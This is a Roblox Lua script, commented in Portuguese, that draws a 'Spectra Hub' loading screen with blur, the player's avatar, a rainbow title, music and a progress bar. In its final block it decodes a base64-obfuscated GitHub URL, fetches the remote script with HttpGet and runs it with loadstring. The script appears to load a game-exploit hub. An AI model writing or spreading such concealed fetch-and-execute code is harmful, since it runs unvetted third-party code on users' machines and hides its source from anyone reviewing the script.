-- LocalScript - Spectra Hub Loading Screen (com Blur)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer

-- ===== BLUR =====
local blur = Instance.new("BlurEffect")
blur.Size = 16 -- intensidade do desfoque
blur.Parent = Lighting

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "SpectraLoading"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Frame principal (achatado)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 340, 0, 260)
frame.Position = UDim2.new(0.5, -170, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.Parent = gui

-- Bordas arredondadas
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 22)
corner.Parent = frame

-- Borda vermelha
local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 0, 0)
stroke.Thickness = 2
stroke.Parent = frame

-- Avatar do jogador
local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(0, 95, 0, 95)
avatar.Position = UDim2.new(0.5, -47, 0, 18)
avatar.BackgroundTransparency = 1
avatar.Parent = frame

local thumb = Players:GetUserThumbnailAsync(
	player.UserId,
	Enum.ThumbnailType.HeadShot,
	Enum.ThumbnailSize.Size420x420
)
avatar.Image = thumb

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(1, 0)
avatarCorner.Parent = avatar

-- Nome do jogador
local playerName = Instance.new("TextLabel")
playerName.Size = UDim2.new(1, 0, 0, 26)
playerName.Position = UDim2.new(0, 0, 0, 120)
playerName.BackgroundTransparency = 1
playerName.Text = player.Name
playerName.TextColor3 = Color3.fromRGB(255, 255, 255)
playerName.Font = Enum.Font.GothamBold
playerName.TextSize = 17
playerName.Parent = frame

-- Texto Spectra Hub (RGB destacado)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 32)
title.Position = UDim2.new(0, 0, 0, 150)
title.BackgroundTransparency = 1
title.Text = "Spectra Hub"
title.Font = Enum.Font.GothamBlack
title.TextSize = 24
title.TextStrokeTransparency = 0.3
title.Parent = frame

-- Barra de fundo
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0.85, 0, 0, 12)
barBg.Position = UDim2.new(0.075, 0, 1, -38)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.Parent = frame

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(1, 0)
barBgCorner.Parent = barBg

-- Barra de progresso (VERMELHA)
local bar = Instance.new("Frame")
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
bar.Parent = barBg

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(1, 0)
barCorner.Parent = bar

-- Música
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://83064304128519"
sound.Volume = 6
sound.TimePosition = 15
sound.Parent = gui
sound:Play()

-- Barra de loading (8 segundos)
TweenService:Create(
	bar,
	TweenInfo.new(8, Enum.EasingStyle.Linear),
	{ Size = UDim2.new(1, 0, 1, 0) }
):Play()

-- RGB do título
task.spawn(function()
	while gui.Parent do
		for h = 0, 1, 0.01 do
			title.TextColor3 = Color3.fromHSV(h, 1, 1)
			task.wait(0.03)
		end
	end
end)

-- Aos 7 segundos: fade do som + desembaçar
task.delay(7, function()
	-- Fade do som
	TweenService:Create(
		sound,
		TweenInfo.new(1, Enum.EasingStyle.Linear),
		{ Volume = 0 }
	):Play()

	-- Desembaçar
	TweenService:Create(
		blur,
		TweenInfo.new(1, Enum.EasingStyle.Linear),
		{ Size = 0 }
	):Play()
end)

-- Final (8 segundos)
task.delay(8, function()
	gui:Destroy()
	blur:Destroy()

	-- Executa seu script final
	loadstring(game:HttpGet((function(e)
		local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
		e=e:gsub("[^"..b.."=]","")
		return(e:gsub(".",function(x)
			if x=="="then return""end
			local r,f="",(b:find(x)-1)
			for i=6,1,-1 do
				r=r..(f%2^i-f%2^(i-1)>0 and"1"or"0")
			end
			return r
		end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)
			if#x~=8 then return""end
			local c=0
			for i=1,8 do
				c=c+(x:sub(i,i)=="1"and 2^(8-i)or 0)
			end
			return string.char(c)
		end))
	end)("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VsaXphbmRyYWxpbm83Ny1yZ2IvU2NyaXB0cy1kby1hc3N1cmVfVFYvcmVmcy9oZWFkcy9tYWluL1NwZWN0cmElMjBIVUIlMjBWMg==")))()
end)
